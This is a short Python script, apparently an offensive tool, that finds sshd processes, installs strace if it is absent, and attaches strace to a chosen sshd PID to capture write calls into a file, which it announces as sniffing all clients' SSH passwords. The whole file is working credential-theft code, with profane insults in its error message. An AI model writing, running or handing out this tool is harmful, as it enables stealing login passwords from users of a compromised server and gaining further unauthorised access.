import time
import os 
import sys
import subprocess


get_process = os.system('pgrep -l sshd')

try:
    null = open("/dev/null", "w")
    subprocess.Popen("strace", stdout=null, stderr=null)
    null.close()
    
except OSError:
    print("starce not found!! Installing.... Wait!!")
    os.system('sudo apt-get install strace') 

try:
	process = int(input('Enter process ID: '))
	print('Preparing dumping process on PID {}'.format(process))
	time.sleep(3)
	os.system('clear')
except:
	os.system('clear')
	print('\033[0;31m Enter a fucking process! Motherfucker!! \033[0m')
	sys.exit(1)

def dumping():
	print('\033[0;32mStarting sniffing all clients SSH password!! from PID {}\033[0m'.format(process))
	subprocess.call(f'strace -f -p {process} -e trace=write -o Dumped_ssh_passwd',shell=True)
dumping();



